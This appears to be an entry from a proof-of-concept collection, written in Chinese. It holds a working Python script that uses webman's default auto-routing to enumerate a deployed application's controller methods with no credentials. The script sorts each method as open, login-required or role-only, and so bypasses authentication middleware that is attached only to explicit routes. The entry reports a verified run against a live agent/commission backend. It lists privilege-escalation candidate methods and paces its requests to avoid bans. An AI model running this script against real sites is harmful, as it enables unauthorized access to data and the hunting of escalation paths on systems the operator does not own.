# webman 自动路由作为「方法存在性 oracle」：零凭证枚举部署版控制器方法（区分零鉴权直出 / 需登录 / 只判角色）

- **code**: webman-自动路由作为-方法存在性-oracle-零凭证枚举部署版控制器方法-区分零鉴权直出-需登录-只判角色
- **kind**: script
- **category**: unauthorized
- **component**: webman（PHP 常驻框架，含 Pear Admin 后台）
- **versions**: webman 1.x/2.x（未调用 Route::disableDefaultRoute() 即受影响）；同族框架 thinkphp/workerman 的默认路由亦同理
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（webman，Ubuntu+nginx）实测：零凭证 GET /api/agent/<method> 枚举 90 个候选，正确定位部署版 app\controller\api\AgentController 的 26 个真实方法 —— 22 个方法体自抛 {"code":401,"message":"未登录"}、team-overview/team-levels 零凭证即返回 {"code":403,"message":"无代理权限"}（只判角色不判登录）、commission-rates/calculate-commission 零凭证直出业务数据；apply/upgrade/become-agent/set-proxy/transfer 等 40+ 提权候选全部 webman 404，据此排除「代理后台存在自助升级/开户入口」。对照成立：显式路由 /api/v1/agent/commission-rates 被 AuthMiddleware 拦（缺少认证信息），自动路由 /api/agent/commission-rates 直出数据。
- **path**: pocs/webman-自动路由作为-方法存在性-oracle-零凭证枚举部署版控制器方法-区分零鉴权直出-需登录-只判角色/webman_autoroute_method_oracle.py
- **tags**: webman,自动路由,未授权,方法枚举,oracle,鉴权测绘
- **created_at**: 2026-10-12T11:46:59.218Z
- **found_by**: exploit

## 描述

webman 默认自动路由开启、且鉴权只挂在显式路由上时，可用 /<ctrl>/<method> 的「404 页面 vs 方法体 JSON」差异做零凭证方法存在性 oracle：无源码即可枚举部署版控制器的全部 public 方法，并区分「零鉴权直出数据」「需登录」「只判角色不判登录」三档。用于快速定位未授权接口与自助提权方法。

## 用法

```
python webman_autoroute_method_oracle.py https://target.com api agent info team-tree create-account
# 通用：把第三参数换成目标控制器名，第四参数起为候选方法名；缺省跑内置 40 个代理类方法候选。
# 走本机 HTTP 代理时，在 probe() 里传 proxy="http://127.0.0.1:7892"（或直接换成 curl -x 调用）。
# 建议间隔 ≥2s；命中 EXISTS-OPEN / EXISTS-ROLE-ONLY 后立刻用显式路由对照一次，确认是「中间件被跳过」而不是路由配置错误。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webman 自动路由「方法存在性 oracle」+ 未授权控制器测绘
--------------------------------------------------------------
原理
  1) webman 默认（自动）路由开启时，URL /<目录路径>/<控制器>/<方法> 会直达
     app\controller\<目录>\<控制器>Controller::<方法>，且【不经过只在显式路由上
     注册的路由级中间件】（如 app\middleware\AuthMiddleware）。
  2) 因此：同一个业务方法往往有两条路径 ——
       显式路由 /api/v1/agent/info        → 被中间件拦：{"code":10003,"message":"缺少认证信息"}
       自动路由 /api/agent/info           → 直达方法体：{"code":401,"message":"未登录"}
     后者说明「方法存在且请求已进入方法体」，只是方法体自己判的登录。
  3) 于是自动路由成为【零凭证、无源码情况下枚举部署版控制器方法】的 oracle：
       方法存在 + 需登录  → 方法体抛未登录/角色不足（JSON）
       方法存在 + 无需登录 → 直接返回业务数据（JSON）
       方法不存在         → 框架 404 页面（HTML）
     注意：方法名大小写不敏感、连字符会被去掉（team-tree ≡ teamTree）。

用法
  python webman_autoroute_oracle.py https://target.com api agent info invite-info team-tree ...
  （第一参数为 base url，第二参数为控制器所在目录，第三参数为控制器名，其余为候选方法）
  也可直接把 CAND 列表换成你想枚举的方法名。

判读
  分类结果三桶：EXISTS-OPEN（零鉴权直出数据，优先深挖）、EXISTS-AUTH（存在但需登录）、
  NOTFOUND（不存在）。EXISTS-AUTH 里若出现「只判角色不判登录」的（例如零凭证就返回
  {"code":403,"message":"无XX权限"} 而不是 401），说明它先查角色后查登录，是一个
  独立的越权面，应单独记档。
"""
import sys, json, urllib.request, urllib.error

CAND = [
    "info", "invite-info", "overview", "my-stats", "performance", "commission",
    "claim-commission", "subordinate-list", "subordinate-bets", "subordinate-finance",
    "subordinate-claims", "create-account", "commission-rates", "calculate-commission",
    "team-tree", "team-overview", "team-levels", "team-trend", "team-moneylogs",
    "member-detail", "security-logs", "action-logs", "bonus-records", "customer-flow",
    "electronic-bets", "subordinate-stats",
    # 提权类候选（找「自助升级 / 改自己属性」的方法）
    "apply", "apply-agent", "upgrade", "become-agent", "set-proxy", "register-agent",
    "open-agent", "add-subordinate", "update-subordinate", "set-rate", "edit-balance",
]


def probe(base, ctrl_dir, ctrl, method, timeout=20, proxy=None):
    path = "/%s/%s/%s" % (ctrl_dir.strip("/"), ctrl, method)
    url = base.rstrip("/") + path
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
    if proxy:  # 需要 HTTP 代理时：urllib.request.ProxyHandler
        op = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    else:
        op = urllib.request.build_opener()
    try:
        r = op.open(req, timeout=timeout)
        body, code = r.read().decode("utf-8", "replace").strip(), r.status
    except urllib.error.HTTPError as e:
        body, code = e.read().decode("utf-8", "replace").strip(), e.code
    except Exception as e:
        return "ERR", "%s: %s" % (type(e).__name__, str(e)[:80])
    if "<html" in body[:200].lower():
        return "NOTFOUND", body[:60]
    if '"code":401' in body or '"code": 401' in body or "未登录" in body or "缺少认证" in body:
        return "EXISTS-AUTH", body[:110]
    if '"code":403' in body or '"code": 403' in body:
        return "EXISTS-ROLE-ONLY", body[:110]   # 只判角色不判登录 —— 值得单独记档
    if '"code":0' in body or '"code": 0' in body:
        return "EXISTS-OPEN", body[:110]
    return "OTHER", body[:110]


if __name__ == "__main__":
    if len(sys.argv) > 3:
        base, ctrl_dir, ctrl = sys.argv[1], sys.argv[2], sys.argv[3]
        cand = sys.argv[4:] or CAND
    else:
        base, ctrl_dir, ctrl, cand = "https://target.com", "api", "agent", CAND
    res = {}
    for m in cand:
        kind, tail = probe(base, ctrl_dir, ctrl, m)
        res.setdefault(kind, []).append(m)
        print("[%-16s] /%s/%s/%s  %s" % (kind, ctrl_dir, ctrl, m, tail))
        import time; time.sleep(2)   # 保持 ≥2s 间隔，避免触发限速/封禁
    print("\n==== 汇总 ====")
    for k in ("EXISTS-OPEN", "EXISTS-ROLE-ONLY", "EXISTS-AUTH", "OTHER", "NOTFOUND", "ERR"):
        if res.get(k):
            print("%-18s %s" % (k, res[k]))

```
